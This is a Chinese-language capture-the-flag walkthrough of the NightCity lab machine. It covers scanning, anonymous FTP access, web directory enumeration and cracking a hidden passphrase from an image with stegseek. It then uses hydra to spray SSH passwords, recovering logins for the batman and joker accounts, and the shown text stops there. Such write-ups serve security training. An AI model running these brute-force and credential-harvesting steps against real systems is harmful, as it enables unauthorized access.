# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-19 10:31 EDT
Nmap scan report for 192.168.21.8
Host is up (0.00016s latency).
MAC Address: 08:00:27:DF:6A:3D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.21.4
Host is up.
Nmap done: 256 IP addresses (6 hosts up) scanned in 2.65 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.21.8
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-19 10:46 EDT
Nmap scan report for 192.168.21.8
Host is up (0.00039s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.21.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0            4096 Jun 09  2022 reminder [NSE: writeable]
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ce:ac:1c:04:d6:f6:64:d6:d9:9d:88:c9:0d:66:a9:45 (RSA)
|   256 4f:f1:7b:69:5c:47:b2:91:b8:d2:2f:82:73:b7:fc:03 (ECDSA)
|_  256 65:6b:3b:8c:89:81:4d:f3:98:98:5a:ed:57:cf:58:c9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: NightCity Web Server
MAC Address: 08:00:27:DF:6A:3D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.39 ms 192.168.21.8

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.78 seconds
```

# 漏洞利用

ftp端口可以匿名登录，里面下载了一个文件

```
ftp> get reminder.txt
local: reminder.txt remote: reminder.txt
229 Entering Extended Passive Mode (|||33710|)
150 Opening BINARY mode data connection for reminder.txt (33 bytes).
100% |************************|    33       95.91 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (45.97 KiB/s)
┌──(kali㉿kali)-[~]
└─$ cat reminder.txt  
Local user is in the coordinates
```

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,txt,php -u http://192.168.21.8
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.8
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/images               (Status: 301) [Size: 313] [--> http://192.168.21.8/images/]                                                           
/index.html           (Status: 200) [Size: 8407]
/contact.html         (Status: 200) [Size: 6349]
/about.html           (Status: 200) [Size: 7744]
/gallery.html         (Status: 200) [Size: 8768]
/js                   (Status: 301) [Size: 309] [--> http://192.168.21.8/js/]                                                               
/robots.txt           (Status: 200) [Size: 136]
/secret               (Status: 301) [Size: 313] [--> http://192.168.21.8/secret/]                                                           
/robin                (Status: 200) [Size: 1873]
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/143592.txt           (Status: 400) [Size: 301]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 277]
/blog_post.html       (Status: 200) [Size: 13887]
Progress: 4741016 / 4741020 (100.00%)
===============================================================
Finished
===============================================================
```

/robots.txt

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.8/robots.txt
#Good Job

To continue, you need a workmate. Our lastest news is that Robin is close to
NightCity. Try to find him, Robin has the key!!
```

/robin

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.8/robin
<html>
<head>
        <title>BATMAN Y ROBIN</title>
</head>
<body>
        <h1>BATMAN Y ROBIN VOL. 01. PARTE I.</h1>
        <p>
        Hay un nuevo Dúo Dinámico en la ciudad. Tras la desaparición de Bruce Wayne, y concluida La Batalla por la Capucha, el Hombre Murciélago es ahora Dick Grayson. Pero tendrá que llevar a cabo su misión como justiciero junto a un acompañante imprevisto: Damian Wayne, hijo de Bruce y Talia al Ghul, ha asumido el papel de Robin... después de que Tim Drake, el anterior titular, haya adoptado otra identidad y emprendido una difícil búsqueda destinada a arrojar increíbles resultados sobre el verdadero destino del mentor de todos ellos. Sin embargo, mientras tanto, Dick y Damian deberán afrontar una Gotham que parece más enloquecida que nunca: a villanos cada vez más insólitos, entre ellos el Profesor Pyg y los demás miembros de su Circo de lo Extraño, se une el regreso de otro excompañero de Batman. Jason Todd, alias Capucha Roja, no solo cuenta con alguien muy sorprendente para ayudarle... ¡también está decidido a poner fin al reinado de los nuevos Batman y Robin antes incluso de que empiece!
        </p>
        <p>
        Grant Morrison y Frank Quitely, un tándem con obras tan reconocidas como All-Star Superman y New X-Men, toma las riendas de la primera colección del Caballero Oscuro y el Chico Maravilla que lleva sus nombres en el título... aunque los integrantes de este equipo no sean los habituales ni por asomo. Junto a Philip Tan (Batman del Futuro: La ciudad de japon), los dos aclamados autores escoceses abren una etapa repleta de innovadores conceptos y situaciones sin parangón que no dejarán indiferente a ningún lector. Lo demuestran a la perfección los dos arcos argumentales iniciales de la serie, Batman renacido y La venganza de Capucha Roja, que se incluyen íntegramente en este tomo de Batman Saga
        </p>
</body>
</html>
```

/secret下有三个图片，下载下来，看看有什么

```
┌──(kali㉿kali)-[~]
└─$ stegseek most-wanted.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "japon"          
[i] Original filename: "pass.txt".
[i] Extracting to "most-wanted.jpg.out".

                                                                     
┌──(kali㉿kali)-[~]
└─$ cat most-wanted.jpg.out 
VGhpc0lzVGhlUmVhbFBhc3N3MHJkIQ==
┌──(kali㉿kali)-[~]
└─$ echo "VGhpc0lzVGhlUmVhbFBhc3N3MHJkIQ==" | base64 -d
ThisIsTheRealPassw0rd!
```

从页面上保存一个字典，进行爆破

```
┌──(kali㉿kali)-[~]
└─$ cewl http://192.168.21.8/robin --lowercase > user
                                                                     
┌──(kali㉿kali)-[~]
└─$ hydra -L user -p ThisIsTheRealPassw0rd! ssh://192.168.21.8:22
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-19 11:24:29
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 176 login tries (l:176/p:1), ~11 tries per task
[DATA] attacking ssh://192.168.21.8:22/
[22][ssh] host: 192.168.21.8   login: batman   password: ThisIsTheRealPassw0rd!                                                           
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-19 11:24:58
```

ssh登录

```
┌──(kali㉿kali)-[~]
└─$ ssh batman@192.168.21.8                                      
The authenticity of host '192.168.21.8 (192.168.21.8)' can't be established.
ED25519 key fingerprint is SHA256:b5bJxI3fDeAAZm5bTrbGo9f1KEpEBR0FiU/HV8nzM3M.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.21.8' (ED25519) to the list of known hosts.
batman@192.168.21.8's password: 

 _   _ _       _     _    ____ _ _         
| \ | (_) __ _| |__ | |_ / ___(_) |_ _   _ 
|  \| | |/ _` | '_ \| __| |   | | __| | | |
| |\  | | (_| | | | | |_| |___| | |_| |_| |
|_| \_|_|\__, |_| |_|\__|\____|_|\__|\__, |
         |___/                       |___/ 

***  NightCityCTF © 2022 by Waidroc & Cillo31 is licensed under CC BY-NC-SA 4.0.  ***
              ***  https://www.github.com/Waidroc/NightCityCTF ***                   

Welcome to Ubuntu 18.04.6 LTS (5.4.0-84-generic).

System information as of: Fri Sep 19 17:26:07 CEST 2025

System Load:    0.04    IP Address:
Memory Usage:   9.1%    System Uptime:  57 min
Usage On /:     64% Swap Usage: 0.0%
Local Users:    0   Processes:  131

*** System restart required ***
38 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Last login: Wed Jun 15 19:15:17 2022 from 10.0.2.8
batman@NightCity:~$ 
```

# 权限提升

```
batman@NightCity:~$ ls -la
total 308
drwxr-xr-x 5 batman        batman          4096 jun 15  2022 .
drwxr-xr-x 6 root          root            4096 jun  9  2022 ..
-rw------- 1 batman        batman           972 jun 15  2022 .bash_history
-rw-r--r-- 1 batman        batman           220 jun  8  2022 .bash_logout
-rw-r--r-- 1 batman        batman          3771 jun  8  2022 .bashrc
drwx------ 2 batman        batman          4096 jun  9  2022 .cache
-rw-r--r-- 1 root          root              66 jun  9  2022 flag.txt
drwx------ 3 batman        batman          4096 jun  9  2022 .gnupg
-rw-rw-r-- 1 administrator administrator 272105 jun  9  2022 iknowyou.jpg                                                                 
drwxrwxr-x 3 batman        batman          4096 jun 15  2022 .local
-rw-r--r-- 1 batman        batman           807 jun  8  2022 .profile
```

把图片下载下来查看有什么

<img width="99" height="305" alt="图片" src="https://github.com/user-attachments/assets/619a2b9b-45f4-4304-8954-49e98405b0ee" />

看一下有什么用户

```
batman@NightCity:~$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
administrator:x:1000:1000:administrator,,,:/home/administrator:/bin/bash
joker:x:1001:1001:Joker,,,:/home/joker:/bin/bash
batman:x:1002:1002:Batman,,,:/home/batman:/bin/bash
anonymous:x:1003:1003:,,,:/home/anonymous:/bin/bash
```

爆破一下

```
┌──(kali㉿kali)-[~]
└─$ hydra -L u -p ThatMadeMeL4ugh! ssh://192.168.21.8:22
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-19 11:54:47
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:5/p:1), ~1 try per task
[DATA] attacking ssh://192.168.21.8:22/
[22][ssh] host: 192.168.21.8   login: joker   password: ThatMadeMeL4ugh!                                                                  
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-19 11:54:50
```
